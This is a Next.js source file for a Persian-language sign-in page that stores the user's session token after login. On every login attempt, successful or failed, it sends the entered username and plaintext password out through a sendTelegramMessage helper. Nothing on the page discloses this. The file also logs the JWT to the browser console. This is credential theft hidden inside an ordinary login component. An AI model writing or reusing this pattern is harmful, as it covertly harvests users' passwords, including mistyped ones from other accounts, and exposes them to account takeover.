"use client"
import LoadingOverlay from '@/app/_components/LoadingOverlay'
import GlobalApi, { sendTelegramMessage } from '@/app/_utils/GlobalApi'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import Link from 'next/link'
import { useRouter } from 'next/navigation'
import React, { useEffect, useState } from 'react'
import { toast } from 'sonner'

function SignIn() {

    const [email, setEmail]=useState();
    const [password, setPassword]=useState();
    const [username, setUsername] = useState();
    const router = useRouter();
    const [loading, setLoading] = useState(false);



    useEffect(()=>{
      const jwt=sessionStorage.getItem('jwt');
        if(jwt){
          router.push('/')
        }
    },[])
  
    const onSignIn=()=>{
      setLoading(true)
      GlobalApi.signIn(email,password).then(resp=>{
        console.log(resp.data.user)
        console.log(resp.data.jwt)
        sessionStorage.setItem('user',JSON.stringify(resp.data.user));
        sessionStorage.setItem('jwt',resp.data.jwt);
        window.location.href = '/';
        toast("ورود با موفقیت انجام شد✅")
        sendTelegramMessage(`user logged in => username: ${email} password: ${password} `)
        setLoading(false)
      },(e)=>{
        console.log(e);
        toast("نام کاربری یا رمز عبور اشتباه است❗")
        sendTelegramMessage(`user entered a wrong password/username!
username: ${email}
entered password: ${password} `)
        setLoading(false)
      })

    }
    const t = () => {
      sendTelegramMessage(`user => create-account`)
    };
  

  return (
    <div lang='fa' dir='rtl' className='flex items-baseline justify-center m-10 ' >
    <div className='flex flex-col gap-5 items-center justify-center p-10 pt-5 bg-slate-200 border border-gray-200 rounded-2xl '>
      <h2 className="font-bold text-3xl">ورود به حساب کاربری </h2>
      <h2 className="text-gray-500">نام کاربری و رمز عبور خود را وارد کنید</h2>
      <div className="w-full flex flex-col mt-7 gap-5">
        <Input dir='rtl' placeholder='نام کاربری' onChange={(e)=>setEmail(e.target.value)} />
        <Input dir='rtl' type='password' placeholder='رمز عبور' onChange={(e)=>setPassword(e.target.value)} />
        <Button onClick={()=>onSignIn()} disabled={!(email&&password)} >ورود</Button>
        <p>حساب کاربری ندارید؟
        <Link onClick={t} href={'/create-account'} className='text-blue-500' >
         ساخت حساب
        </Link>
        </p>
      </div>
    </div>
    <LoadingOverlay loading={loading} />
  </div>
    
  )
}

export default SignIn